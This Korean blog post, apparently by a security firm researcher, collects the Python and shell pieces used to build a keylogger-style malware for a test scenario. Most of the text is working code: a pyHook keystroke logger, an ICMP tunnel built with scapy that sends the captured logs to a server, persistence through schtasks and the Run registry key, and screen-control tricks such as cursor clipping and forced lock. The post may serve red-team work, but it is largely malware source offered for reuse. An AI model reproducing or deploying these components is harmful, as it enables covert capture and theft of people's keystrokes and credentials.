---
layout: post
title: "Keylogger and Other Functions"
author: "Gurumi"
comments: true
tags: [programming, etc]
---

라온화이트햇 핵심연구팀 조운삼

## I. Intro

---

지난 프로젝트 투입 때, 수행한 시나리오에서 사용된 Keylogger 형태의 악성코드를 제작&배포 했을 때 사용한 기능들에 대해 정리해봤습니다.  추후 유사한 내용의 프로젝트 혹은 개발시 참고하면 감사하겠습니다. (개발에 사용한 언어는 Python입니다.)

## II. Functions

---

### II-01 .Keylogger

주요 기능중 하나인 Keylogger 기능은 pyHook을 이용하여 구현하였습니다. 

```python
import pyHook

hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.KeyUp=OnKeyboardEvent
```

보통은 `KeyDown`을 이용하여 입력 키를 파악하는 것이 일반적이지만 Shift 키를 이용한 특수문자 입력 혹은 Ctrl, Alt 키를 이용한 기타 키보드 이벤트를 구분하기 위해 `KeyDown`, `KeyUp`을 이용하여 키보드 이벤트를 구분하였습니다.

```python
def keyboardEventDebug(event):
    print('========================================\n')
    print('MessageName: {}'.format(event.MessageName))
    print('Message: {}'.format(event.Message))
    print('Time: {}'.format(event.Time))
    print('Window: {}'.format(event.Window))
    print('WindowName: {}'.format(event.WindowName))
    print('Ascii: {}'.format(event.Ascii))
    print('Key: {}'.format(event.Key))
    print('KeyID: {}'.format(event.KeyID))
    print('ScanCode: {}'.format(event.ScanCode))
    print('Extended: {}'.format(event.Extended))
    print('Injected: {}'.format(event.Injected))
    print('Alt: {}'.format(event.Alt))
    print('Transition: {}'.format(event.Transition))
    print('========================================\n')
```

pyHook에서 이벤트 발생시 이벤트 객체에 포함되어 있는 구성 요소들입니다. `event.Message`를 통해 KeyDown(256), KeyUp(257)을 구분할 수 있습니다.

`event.Ascii` 혹은 `event.KeyID`를 사용해 입력된 키를 구별할 수 있습니다.( `event.KeyID`를 사용할 경우 좀 더 다양한 키 이벤트를 구별 할 수 있지만, KeyID에 대해 사전에 파악해야 합니다.)

```python
def OnKeyboardEvent(event):
    global lst

    if event.Key=='Scroll':
        os._exit(0)

    # capture the keystrokes
    if event.KeyID !=0:
        keylogs=''
        if event.KeyID==160 and event.Message==256:
            keylogs='[L_Shift Down]'
        elif event.KeyID==160 and event.Message==257:
            keylogs='[L_Shift UP]'
        elif event.KeyID==161 and event.Message==256:
            keylogs='[R_Shift Down]'
        elif event.KeyID==161 and event.Message==257:
            keylogs='[R_Shift UP]'
        elif event.KeyID==162 and event.Message==256:
            keylogs='[L_Control Down]'
        elif event.KeyID==162 and event.Message==257:
            keylogs='[L_Control UP]'
        else:
            if event.Message == 256:
                if event.KeyID==8:
                    keylogs='[Backspace]'
                elif event.KeyID==9:
                    keylogs='[Tab]'
                elif event.KeyID==13:
                    keylogs='[Enter]'
                elif event.KeyID==20:
                    keylogs='[Caps Lock]'
                elif event.KeyID==21:
                    keylogs='[Hangul]'
                elif event.KeyID==32:
                    keylogs='[Space]'
                elif event.KeyID==127:
                    keylogs='[Delete]'
                elif event.KeyID==186:
                    keylogs=';'
                elif event.KeyID==187:
                    keylogs='+'
                elif event.KeyID==188:
                    keylogs=','
                elif event.KeyID==189:
                    keylogs='-'
                elif event.KeyID==190:
                    keylogs='.'
                elif event.KeyID==191:
                    keylogs='/'
                elif event.KeyID==192:
                    keylogs='`'
                elif event.KeyID==219:
                    keylogs='['
                elif event.KeyID==220:
                    keylogs='\\'
                elif event.KeyID==221:
                    keylogs=']'
                elif event.KeyID==222:
                    keylogs='\''
                else:
                    keylogs=event.Key
        if keylogs != '':
            lst.append(keylogs)
    
    return True
```

해당 Keylogger는 키 로그를 `lst`에 저장해 놓도록 되어 있고, 공백류 문자(Enter, Tab, Space)가 입력될 경우 로그를 전송하도록 구현되어 있으며 알파벳과 숫자를 제외한 문자들에 대해 좀 더 직관적으로 파악하기 위해 `KeyID`를 사용해 구분하고 별도의 문자열로 구분했습니다.

### II-02 ICMP Tunneling

```python
# ICMP Tunneling Client
from scapy.all import *

def sendICMP(msg):
    ip = IP(dst='Server IP')/ICMP()/msg.encode('base64').strip()
    send(ip)

# ICMP Tunneling Server
def sniffICMP():
    while True:
				rx = sniff(filter="icmp", count=1)
        return rx[0][Raw].load.decode('base64')
```

로그를 전송하는 부분에서 `scapy`모듈을 사용하여 ICMP Tunneling Server, Client를 구현하였습니다.

base64로 인코딩하여 전송하는 것은 시나리오 수행상 필요한 부분이므로 제거해도 무관합니다.

### II-03 ClipCursor

[ClipCursor function (winuser.h) - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-clipcursor)

```python
import win32api

def moveCursor():
	win32api.ClipCursor((upper-left x-coordinate, upper-left y-coordinate, lower-right x-coordinate, lower-right y-coordinate))
```

해당 기능은 Windows에서 클라이언트의 마우스 커서의 행동 영역을 제한하는 기능입니다. `ClipCursor`의 인자로 빈 값이나 (0,0,0,0)을 넣을 경우 행동 영역 제한이 해제됩니다.

### II-04 Schedule

[schtasks](https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks)

![/assets/2020-07-01/sam0700.png](/assets/2020-07-01/sam0700.png)

```bash
2020/07/03 14:30에 "Task Command"를 한 번 실행시키는 작업을 "Task Name"이라는 이름으로 작업 스케줄 등록
ex) SCHTASKS /create /sc ONCE /SD 2020/07/03 /ST 14:30 /TN "Task Name" /TR "Task Command"

/create 작업 스케줄 생성
/delete 작업 스케줄 삭제
ex) SCHTASKS /delete /Tn "My Task"
/run 등록된 작업 스케줄 (원격/로컬)실행
ex) SCHTASKS /run /Tn "My Task"
/end 작업 스케줄에 의해 실행된 프로그램 (원격/로컬)중지

/sc MINUTE|HOURLY|DAILY|WEEKLY|MONTHLY 매분|시간|일|주|달 마다 실행
/sc ONCE 지정된 날짜 및 시간에 한 번 실행
/sc ONSTART 시스템 시작시 실행
```

Windows에서 제공하는 작업 스케줄러 등록하는 기능입니다. 시나리오 수행에 특정 날짜와 시간대에 동작하도록 하는 기능이 요구되어 구현했습니다.

***시작 프로그램**

```python
from _winreg import *

keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
SetValueEx(key2change, 'MY Execution', 0, REG_SZ, path)
```

작업 스케줄러에 작업 등록과 별개로 "시작 프로그램"에 프로그램 실행을 등록시킬 경우 레지스트리에 등록하면 됩니다.

### II-04 ETC

**Screen Lock**

```bash
# 사용자의 화면을 잠금화면으로 전환
rundll32.exe user32.dll, LockWorkStation
```

O**pen Image**

```bash
#전체화면으로 open
start "" /max "imagePath"
```

**Change Wallpaper**

```python
# 지정된 경로의 이미지로 시스템 배경화면 변경
import ctypes
SPI_SETDESKWALLPAPER = 20 
ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_Path , 0)
```

3개 기능 모두 Windows 화면제어에 관한 기능을 수행합니다.